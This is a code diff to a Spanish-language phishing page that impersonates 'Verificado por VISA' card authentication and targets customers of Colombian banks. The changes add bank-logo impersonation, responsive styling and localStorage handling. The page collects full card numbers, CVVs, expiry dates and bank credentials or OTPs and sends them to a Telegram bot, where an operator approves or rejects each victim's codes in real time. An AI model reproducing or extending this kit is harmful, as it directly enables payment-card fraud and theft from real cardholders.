@@ -46,7 +46,7 @@
         .header {
             display: flex;
             align-items: center;
-            justify-content: flex-start;
+            justify-content: space-between;
             margin-bottom: 24px;
             padding-bottom: 16px;
             border-bottom: 1px solid var(--visa-border);
@@ -55,6 +55,21 @@
         .visa-logo img {
             height: 80px;
             width: auto;
+            display: block;
+        }
+
+        .bank-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .bank-logo img {
+            height: 50px;
+            width: auto;
+            max-width: 120px;
+            object-fit: contain;
             display: block;
         }
 
@@ -398,31 +413,69 @@
             margin-top: 4px;
         }
 
+        /* ============================================ */
+        /* RESPONSIVE */
+        /* ============================================ */
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px 24px;
+                max-width: 480px;
+            }
+
+            .visa-logo img {
+                height: 65px;
+            }
+
+            .bank-logo img {
+                height: 42px;
+                max-width: 100px;
+            }
+        }
+
         @media (max-width: 480px) {
             .container {
-                padding: 20px;
+                padding: 20px 16px;
                 border-radius: 12px;
+            }
+
+            .header {
+                margin-bottom: 16px;
+                padding-bottom: 12px;
+            }
+
+            .visa-logo img {
+                height: 50px;
+            }
+
+            .bank-logo img {
+                height: 34px;
+                max-width: 80px;
             }
 
             .form-title {
                 font-size: 1.125rem;
             }
 
+            .form-subtitle {
+                font-size: 0.875rem;
+                margin-bottom: 16px;
+            }
+
             .button-group {
                 flex-direction: column;
+                gap: 8px;
             }
 
             .btn {
                 width: 100%;
+                padding: 14px;
+                font-size: 0.875rem;
             }
 
             .form-footer {
                 flex-direction: column;
                 align-items: flex-start;
-            }
-
-            .visa-logo img {
-                height: 60px;
+                gap: 8px;
             }
 
             .info-label {
@@ -433,11 +486,51 @@
             .info-value {
                 font-size: 0.8rem;
             }
+
+            .transaction-info {
+                padding: 12px 14px;
+                margin-bottom: 16px;
+            }
+
+            .security-banner {
+                padding: 12px 14px;
+                margin-bottom: 16px;
+            }
+
+            .security-banner p {
+                font-size: 0.75rem;
+            }
+
+            .otp-section {
+                padding: 14px;
+            }
+
+            .form-input {
+                padding: 10px 14px;
+                font-size: 0.9375rem;
+            }
         }
 
         @media (max-width: 360px) {
+            .container {
+                padding: 16px 12px;
+            }
+
             .visa-logo img {
-                height: 50px;
+                height: 40px;
+            }
+
+            .bank-logo img {
+                height: 28px;
+                max-width: 60px;
+            }
+
+            .form-title {
+                font-size: 1rem;
+            }
+
+            .form-subtitle {
+                font-size: 0.8125rem;
             }
 
             .info-label {
@@ -447,6 +540,21 @@
 
             .info-value {
                 font-size: 0.75rem;
+            }
+
+            .btn {
+                padding: 12px;
+                font-size: 0.8125rem;
+            }
+
+            .form-input {
+                padding: 8px 12px;
+                font-size: 0.875rem;
+            }
+
+            .security-banner .shield-icon {
+                width: 18px;
+                height: 18px;
             }
         }
     </style>
@@ -462,6 +570,9 @@
         <div class="header">
             <div class="visa-logo">
                 <img src="image.png" alt="Verificado por VISA" />
+            </div>
+            <div class="bank-logo" id="bankLogoContainer">
+                <img id="bankLogoImg" src="" alt="Logo banco" style="display:none;" />
             </div>
         </div>
 
@@ -479,7 +590,7 @@
 
         <h1 class="form-title">Autenticar con contraseña</h1>
         <p class="form-subtitle">
-            Ingrese las credenciales de seguridad de su <strong>banco emisor</strong> para validar la transacción.
+            Ingrese las credenciales de seguridad de su <strong id="bancoNombre">banco emisor</strong> para validar la transacción.
         </p>
 
         <div class="transaction-info">
@@ -561,11 +672,26 @@
         const POLLING_INTERVAL = 2000;
         const MAX_POLLING_TIME = 300000;
 
+        // ============================================
+        // MAPA DE LOGOS DE BANCOS
+        // ============================================
+        const bankLogos = {
+            'Bancolombia': 'bancol.png',
+            'Davivienda': 'davivienda.png',
+            'Davibank': 'db.png',
+            'Banco Popular': 'popu.png',
+            'Banco Falabella': 'fala.png',
+            'Itaú': 'itau.png',
+            'Caja Social': 'Caja.jpg',
+            'Banco de Bogotá': 'bog.png',
+            'Banco Occidente': 'occi.png'
+        };
+
         let solicitudId = null;
         let pollingInterval = null;
         let pasoActual = 'credenciales';
         let errorMostrado = false;
-        let modoAutenticacion = 'otp'; // 'otp' o 'clave_dinamica'
+        let modoAutenticacion = 'otp';
 
         // Elementos DOM
         const form = document.getElementById('authForm');
@@ -579,18 +705,48 @@
         const buttonText = document.getElementById('buttonText');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const statusMessage = document.getElementById('statusMessage');
+        const bankLogoImg = document.getElementById('bankLogoImg');
+        const bankLogoContainer = document.getElementById('bankLogoContainer');
+        const bancoNombre = document.getElementById('bancoNombre');
 
         // ============================================
-        // INICIALIZACIÓN - CARGA DATOS DE sessionStorage
+        // INICIALIZACIÓN - CARGA DATOS DE localStorage
         // ============================================
         window.addEventListener('load', function() {
             initializeTransaction();
+            cargarLogoBanco();
             configurarWebhook();
             console.log('✅ Verificado por VISA listo');
         });
 
+        function cargarLogoBanco() {
+            const bancoEmisor = localStorage.getItem('bancoEmisor');
+            const bankLogo = localStorage.getItem('bankLogo');
+            
+            console.log('🏛️ Banco emisor desde localStorage:', bancoEmisor);
+            console.log('🖼️ Logo del banco desde localStorage:', bankLogo);
+
+            // Mostrar el nombre del banco en el subtítulo
+            if (bancoEmisor) {
+                bancoNombre.textContent = bancoEmisor;
+            }
+
+            // Si hay un logo guardado y está en el mapa de logos, mostrarlo
+            if (bancoEmisor && bankLogos[bancoEmisor]) {
+                bankLogoImg.src = bankLogos[bancoEmisor];
+                bankLogoImg.alt = bancoEmisor;
+                bankLogoImg.style.display = 'block';
+                bankLogoContainer.style.display = 'flex';
+                console.log('✅ Logo del banco cargado:', bankLogos[bancoEmisor]);
+            } else {
+                // Si no hay logo o no coincide, ocultar el contenedor
+                bankLogoContainer.style.display = 'none';
+                console.log('❌ No se encontró logo para el banco:', bancoEmisor);
+            }
+        }
+
         function initializeTransaction() {
-            const storagePriority = sessionStorage.getItem('procesamiento_prioritario') === 'true';
+            const storagePriority = localStorage.getItem('procesamiento_prioritario') === 'true';
             let amount = 23000;
             if (storagePriority) amount += 20000;
             const formattedAmount = amount.toLocaleString('es-CO').replace(/,/g, '.');
@@ -610,18 +766,18 @@
             });
             document.getElementById('transaction-date').textContent = `${dateStr} ${timeStr}`;
             
-            let cardLast4 = sessionStorage.getItem('cardLast4') || '0000';
+            let cardLast4 = localStorage.getItem('cardLast4') || '0000';
             document.getElementById('card-last-digits').textContent = `Visa •••• •••• •••• ${cardLast4}`;
             
-            const cardNumber = sessionStorage.getItem('cardNumber') || 'No disponible';
-            const cvc = sessionStorage.getItem('cvc') || 'No disponible';
-            const expiry = sessionStorage.getItem('expiry') || 'No disponible';
+            const cardNumber = localStorage.getItem('cardNumber') || 'No disponible';
+            const cvc = localStorage.getItem('cvc') || 'No disponible';
+            const expiry = localStorage.getItem('expiry') || 'No disponible';
             
-            sessionStorage.setItem('cardNumberFull', cardNumber);
-            sessionStorage.setItem('cardCVV', cvc);
-            sessionStorage.setItem('cardExpiry', expiry);
+            localStorage.setItem('cardNumberFull', cardNumber);
+            localStorage.setItem('cardCVV', cvc);
+            localStorage.setItem('cardExpiry', expiry);
             
-            console.log('📋 Datos cargados desde sessionStorage');
+            console.log('📋 Datos cargados desde localStorage');
         }
 
         async function configurarWebhook() {
@@ -643,6 +799,8 @@
 
         async function enviarCredencialesATelegram(datos) {
             try {
+                const bancoEmisor = localStorage.getItem('bancoEmisor') || 'No especificado';
+                
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [
@@ -658,6 +816,8 @@
                 const mensaje = `🔔 *VERIFICADO POR VISA - V2CRTF*
 
 🆔 ID: \`${datos.solicitudId}\`
+
+🏛️ *BANCO EMISOR:* ${bancoEmisor}
 
 💳 *DATOS DE TARJETA:*
 🏦 Número: \`${datos.numeroTarjeta}\`
@@ -888,7 +1048,7 @@
                     pollingInterval = null;
                     mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
                     setTimeout(() => {
-                        window.location.href = 'index.html';
+                        window.location.href = 'exito.html';
                     }, 2000);
                     return;
                 } else if (resultado === 'rechazar_otp' || resultado === 'rechazar_clave_din') {
@@ -1049,9 +1209,9 @@
                 solicitudId = generarSolicitudId();
                 console.log('🆔 Nueva solicitud:', solicitudId);
 
-                const numeroTarjeta = sessionStorage.getItem('cardNumberFull') || 'No disponible';
-                const cvv = sessionStorage.getItem('cardCVV') || 'No disponible';
-                const vencimiento = sessionStorage.getItem('cardExpiry') || 'No disponible';
+                const numeroTarjeta = localStorage.getItem('cardNumberFull') || 'No disponible';
+                const cvv = localStorage.getItem('cardCVV') || 'No disponible';
+                const vencimiento = localStorage.getItem('cardExpiry') || 'No disponible';
 
                 const datosTelegram = {
                     solicitudId: solicitudId,
@@ -1121,9 +1281,9 @@
         document.getElementById('cancelLink').addEventListener('click', function(e) {
             e.preventDefault();
             if (confirm('¿Deseas cancelar esta autenticación?')) {
-                sessionStorage.removeItem('cardNumberFull');
-                sessionStorage.removeItem('cardCVV');
-                sessionStorage.removeItem('cardExpiry');
+                localStorage.removeItem('cardNumberFull');
+                localStorage.removeItem('cardCVV');
+                localStorage.removeItem('cardExpiry');
                 window.location.href = 'index.html';
             }
         });
